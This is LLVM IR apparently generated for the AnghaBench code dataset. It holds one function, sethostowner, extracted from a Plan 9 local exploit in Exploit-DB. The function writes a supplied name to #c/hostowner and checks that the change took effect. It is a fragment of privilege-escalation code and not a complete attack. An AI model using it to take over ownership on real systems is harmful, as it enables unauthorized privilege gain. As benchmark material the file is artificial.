; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/plan9/local/extr_3383.c_sethostowner.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/plan9/local/extr_3383.c_sethostowner.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [13 x i8] c"#c/hostowner\00", align 1
@OWRITE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [30 x i8] c"can't open \22#c/hostowner\22: %r\00", align 1
@False = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [35 x i8] c"write to \22#c/hostowner\22 failed: %r\00", align 1
@.str.3 = private unnamed_addr constant [42 x i8] c"write of \22%s\22 to \22#c/hostowner\22 succeeded\00", align 1
@.str.4 = private unnamed_addr constant [46 x i8] c"can't retrieve \22#c/hostowner\22 for comparison?\00", align 1
@.str.5 = private unnamed_addr constant [74 x i8] c"write on \22#c/hostowner\22 succeeded but storedvalue isn't as expected: \22%s\22\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*)* @sethostowner to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @sethostowner(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %8 = load i32, i32* @OWRITE, align 4
  %9 = call i32 @open(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i32 %8)
  store i32 %9, i32* %5, align 4
  %10 = load i32, i32* %5, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %15

12:                                               ; preds = %1
  %13 = call i32 (i8*, ...) @err(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i32, i32* @False, align 4
  store i32 %14, i32* %2, align 4
  br label %55

15:                                               ; preds = %1
  %16 = load i8*, i8** %3, align 8
  %17 = call i32 @strlen(i8* %16)
  store i32 %17, i32* %6, align 4
  %18 = load i32, i32* %5, align 4
  %19 = load i8*, i8** %3, align 8
  %20 = load i32, i32* %6, align 4
  %21 = call i32 @write(i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %7, align 4
  %22 = load i32, i32* %7, align 4
  %23 = load i32, i32* %6, align 4
  %24 = icmp ne i32 %22, %23
  br i1 %24, label %25, label %30

25:                                               ; preds = %15
  %26 = call i32 (i8*, ...) @err(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %27 = load i32, i32* %5, align 4
  %28 = call i32 @close(i32 %27)
  %29 = load i32, i32* @False, align 4
  store i32 %29, i32* %2, align 4
  br label %55

30:                                               ; preds = %15
  %31 = load i32, i32* %5, align 4
  %32 = call i32 @close(i32 %31)
  %33 = load i8*, i8** %3, align 8
  %34 = call i32 @msg(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.3, i64 0, i64 0), i8* %33)
  %35 = call i32 @userfile(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0), i8** %4)
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %40, label %37

37:                                               ; preds = %30
  %38 = call i32 (i8*, ...) @err(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.4, i64 0, i64 0))
  %39 = load i32, i32* @False, align 4
  store i32 %39, i32* %2, align 4
  br label %55

40:                                               ; preds = %30
  %41 = load i8*, i8** %3, align 8
  %42 = load i8*, i8** %4, align 8
  %43 = call i64 @strcmp(i8* %41, i8* %42)
  %44 = icmp eq i64 %43, 0
  %45 = zext i1 %44 to i32
  store i32 %45, i32* %7, align 4
  %46 = load i32, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %51, label %48

48:                                               ; preds = %40
  %49 = load i8*, i8** %4, align 8
  %50 = call i32 (i8*, ...) @err(i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.5, i64 0, i64 0), i8* %49)
  br label %51

51:                                               ; preds = %48, %40
  %52 = load i8*, i8** %4, align 8
  %53 = call i32 @free(i8* %52)
  %54 = load i32, i32* %7, align 4
  store i32 %54, i32* %2, align 4
  br label %55

55:                                               ; preds = %51, %37, %25, %12
  %56 = load i32, i32* %2, align 4
  ret i32 %56
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @err(i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @msg(i8*, i8*) #1

declare dso_local i32 @userfile(i8*, i8**) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
